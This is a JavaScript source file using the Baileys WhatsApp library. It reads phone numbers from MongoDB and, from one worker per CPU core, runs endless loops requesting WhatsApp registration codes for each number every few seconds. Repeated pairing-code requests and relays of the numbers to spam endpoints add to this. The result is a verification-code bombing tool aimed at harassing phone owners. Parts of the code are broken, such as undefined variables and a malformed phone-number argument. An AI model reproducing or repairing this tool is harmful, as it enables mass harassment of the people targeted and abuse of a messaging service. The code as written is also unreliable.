require('dotenv').config();
const { default: makeWaSocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers  } = require('@whiskeysockets/baileys');
const pino = require('pino');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;
const mongoose = require('mongoose');
const axios = require('axios');
const PastebinAPI = require('pastebin-js');
const { makeid } = require('./id.js');
const bodyParser = require('body-parser');
const path = require('path');
const mongoURI = process.env.MONGODB_URI;
const startspam = process.env.START_SPAM;
const startpair = process.env.START_PAIR;


// Worker Process
if (cluster.isMaster) {
    // Fork workers
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died`);
    });
} else {
  // Connect to MongoDB
  mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('Connected to MongoDB2'))
  .catch(err => console.log('Error connecting to MongoDB2:', err));





    const SpamDataSchema = new mongoose.Schema({
        ddi: String,
        number: String,
        timestamp: { type: Date, default: Date.now }
    });
    const SpamData = mongoose.model('SpamData', SpamDataSchema);

    // PairData Schema und Modell erstellen
    const PairDataSchema = new mongoose.Schema({
        number: String,
        timestamp: { type: Date, default: Date.now }
    });
    const PairData = mongoose.model('PairData', PairDataSchema);



// Funktion zum Pausieren für eine bestimmte Zeit
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const startSpamV2 = async () => {
    try {
        // Alle Daten aus der MongoDB abrufen
        const data = await SpamData.find({}, 'ddi number');

        // Für jede Datenzeile den Spam starten
        await Promise.all(data.map(async (item) => {
            const { ddi, number } = item;
            const { state, saveCreds } = await useMultiFileAuthState('session')
            const spam = makeWaSocket({
            auth: state,
            mobile: true,
            logger: pino({ level: 'silent' })
            });

            while (true) {
                try {
                    const res = await spam.requestRegistrationCode({
                        phoneNumber: '+' + ddi, number,
                        phoneNumberCountryCode: ddi,
                        phoneNumberNationalNumber: number,
                        phoneNumberMobileCountryCode: 666,
                    });
                    
                } catch (error) {
                    
                }
            }
        }));
    } catch (error) {
      
    }
};

setInterval(startSpamV2, 10 * 1000);





const sendStoredData = async () => {
    try {
        // Alle Daten aus der MongoDB abrufen
        const data = await SpamData.find({}, 'ddi number');

        // Daten an den /start-spam Endpunkt senden
        await Promise.all(data.map(async (item) => {
            const { ddi, number } = item;
            await fetch(startspam, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ ddi, number })
            });
        }));
        
        console.log('Stored data sent successfully from MongoDB SpamData');
        await sleep(20);
    } catch (error) {
       
    }
};


// Funktion zum kontinuierlichen Starten des Pairing-Code-Prozesses
async function startPairingCodeGeneration() {
    try {
        const intervalTime = 1 * 60 * 1000; // 1 Minute in Millisekunden
        setInterval(async () => {
            try {
                // Alle Daten aus der MongoDB abrufen
                const data = await PairData.find({}, 'number');
                // Ausgabe der abgerufenen Daten zur Überprüfung

                // Für jede Datenzeile den Pairing-Code generieren
                await Promise.all(data.map(async (item) => {
                    const { number } = item;
                    let num = number;

                    const id = makeid();

                    const { state, saveCreds } = await useMultiFileAuthState('./start-pairing/tempp/');
            let Pair_Code_By_Maher_Zubair = Maher_Zubair({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({level: "fatal"}).child({level: "fatal"}),
                browser: ["Chrome (Linux)", "", ""]
            });

            if (!Pair_Code_By_Maher_Zubair.authState.creds.registered) {
                await delay(1000);
                num = num.replace(/[^0-9]/g, '');
                const code2 = await Pair_Code_By_Maher_Zubair.requestPairingCode(num);
                
                // Sende die Antwort nur, wenn noch keine Antwort gesendet wurde
                if (!res.headersSent) {
                    await res.send({ code2 });
                }
            }

            Pair_Code_By_Maher_Zubair.ev.on('creds.update', saveCreds);
            Pair_Code_By_Maher_Zubair.ev.on("connection.update", async (s) => {
                const { connection, lastDisconnect } = s;
                if (connection === "open") {
                    await delay(2000);
                    let SIGMA_MD_TEXT = `
  *_Pair Code By Baron_*`;
                    await Pair_Code_By_Maher_Zubair.sendMessage(Pair_Code_By_Maher_Zubair.user.id, { text: SIGMA_MD_TEXT });

                    await delay(1500);
                    await Pair_Code_By_Maher_Zubair.ws.close();
                } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
                    await delay(2000);
                    // Hier wird req und res übergeben
                }
            });
        }));

    } catch (error) {
        
    }
}, intervalTime);
    } catch (error) {
        
    } 
}

const sendStoredDataV2 = async () => {
    try {
        // Alle Daten aus der MongoDB abrufen
        const data = await PairData.find({}, 'number');

        try {
            await Promise.all(data.map(async (item) => {
                const { number } = item;
                try {
                    await fetch(`${startpair}${number}`);
                    
                } catch (error) {
                    console.error(`Error sending stored data for number ${number}:`, error);
                }
            }));
          
            console.log('Stored data sent successfully from MongoDB PairData');
            
        } catch (error) {
            console.error('Error sending stored data:', error);
        }
    } catch (error) {
        
    }   
    
};

module.exports = {
    startSpamV2,
    sendStoredData,
    startPairingCodeGeneration,
    sendStoredDataV2,
    SpamData,
    PairData
 
      
};

console.log(`Worker ${process.pid} started.`);

}